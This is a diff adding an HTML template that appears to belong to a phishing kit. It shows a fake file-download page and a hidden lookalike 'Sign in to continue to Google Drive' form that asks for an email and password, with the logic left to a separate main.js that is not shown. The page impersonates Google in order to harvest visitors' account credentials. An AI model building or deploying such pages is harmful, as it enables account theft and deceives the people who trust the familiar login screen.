@@ -1,0 +1,31 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="../style.css">
+    <title>{{filename}}</title>
+</head>
+<body>
+    <div class="container" id="downloadPage">
+        <div class="file-info">
+            <img src="https://pomf2.lain.la/f/lajakxn.jpg" alt="File Icon">
+            <div class="file-name">{{filename}}</div>
+            <div class="file-size">{{size}}</div>
+        </div>
+        <a class="download-btn" id="downloadBtn" href="#">Download</a>
+    </div>
+
+    <div class="login-container" id="loginPage" style="display: none;">
+        <h2>Sign in</h2>
+        <p>to continue to Google Drive</p>
+        <form id="loginForm">
+            <input type="email" id="email" name="email" placeholder="Email or phone" required>
+            <input type="password" id="password" name="password" placeholder="Enter your password" required>
+            <button type="submit">Next</button>
+        </form>
+    </div>
+
+    <script src="./main.js"></script>
+</body>
+</html>
